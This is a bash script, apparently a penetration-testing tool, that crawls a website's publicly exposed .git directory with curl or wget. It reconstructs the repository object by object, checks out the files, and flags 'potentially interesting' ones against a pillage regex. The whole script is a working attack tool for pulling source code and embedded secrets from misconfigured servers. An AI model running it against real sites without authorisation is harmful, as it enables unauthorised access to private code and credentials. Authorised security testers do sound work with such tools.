#!/bin/bash

if [[ -z $2 ]]; then
    cat<<EOF
Usage:
    $0 protocol hostname/directory single_file
    (directory and single_file are optional)
Example:
    $0 http www.example.com/images (would crawl http://example.com/images/.git/)
    $0 https www.example.com (would crawl https://example.com/.git/)
EOF
exit 1
else
    #Parse out directories and build base url
    if [[ $2 =~ "/" ]] ; then
        HOST=${2%%/*}
        DIR=${2#*/}
    else
        HOST=$2
        DIR=""
    fi
    if [[ -z $DIR ]]; then
        BASEURL="$1://${HOST}/.git/"
    else
        BASEURL="$1://${HOST}/${DIR}/.git/"
    fi
fi

CURL_AVAILABLE=`which curl`
WGET_AVAILABLE=`which wget`
if [[ -z $CURL_AVAILABLE && -z $WGET_AVAILABLE ]]; then
    echo "Unable to find useable http client (need curl or wget)"
    exit 1
elif [ -e $WGET_AVAILABLE ]; then
    CRAWLER='wget'
else
    CRAWLER='curl'
fi

OFS=$IFS
export IFS="/"
DIR_COUNT=0
for word in $DIR; do
    let DIR_COUNT=$DIR_COUNT+1
done
export IFS=$OFS

# FUNCTIONS HERP DERP
function get {
    if [ ! -e .git/$1 ]; then
      echo "Getting $1"
      if [ "$CRAWLER" == 'wget' ]; then
          wget $BASEURL$1 -x -nH --cut-dirs=$DIR_COUNT
      else
          curl $BASEURL$1 -s -f -S --create-dirs -o .git/$1
      fi
    fi
}

function getsha {
    dir=${1:0:2}
    filename=${1:2:40}
    get "objects/${dir}/${filename}"
}

#####################

# 1 - git init
git init ${HOST}
cd ${HOST}

#2 - get static files
get "HEAD"
get "config"

#3 - get ref from HEAD
ref=`cat .git/HEAD|awk '{print $2}'`
get $ref

#4 - get object from ref
getsha `cat .git/$ref`

#5 - get index
get "index"
get ".gitignore"

if [ "$3" != "" ]; then
   echo "Getting single file: $3"
   sha=`git ls-files --stage|grep $3|head -1|awk '{print $3}'`
   getsha $sha
   git checkout $3
   exit 0
fi

echo "About to make `git ls-files|wc -l` requests to ${HOST}; This could take a while"
read -p "Do you want to continue? (y/n)"
[ "$REPLY" == "y" ] || exit

#6 - Try and download objects based on sha values
for line in `git ls-files --stage|awk '{print $2}'`
do
    getsha $line
done

#7 - use git fsck trick from github.com/kost to get the final missing references
# I don't have time to test but I think this could completely replace the ls-files above as well
file="asdf"
prev=""
while [ "$file" != "" ]
do
    prev=$file
    file=`git fsck 2>&1 |grep "^missing"|awk '{print $3}'`
    if [ "$file" == "$prev" ]
    then
        break
    fi
    getsha $file
done

#8 - try and checkout files. It's not perfect, but you might get lucky
# Doing with the pipe as the original method split lines with
# spaces in them into two lines. Don't know why but this version works
echo "Trying to checkout files"
git ls-files | while read line;
do
    git checkout "$line"
done

#9 - Reporting
echo -e "\n\n#### Potentially Interesting Files #### \n\n"
for file in `git ls-files|grep -i -f ../pillage.regex|grep -E -v "\.(gif|png|jpg|css|js|html)$"`
do
    echo -n $file
    if [ -e $file ]; then
        echo " - [CHECKED OUT]"
    fi
done
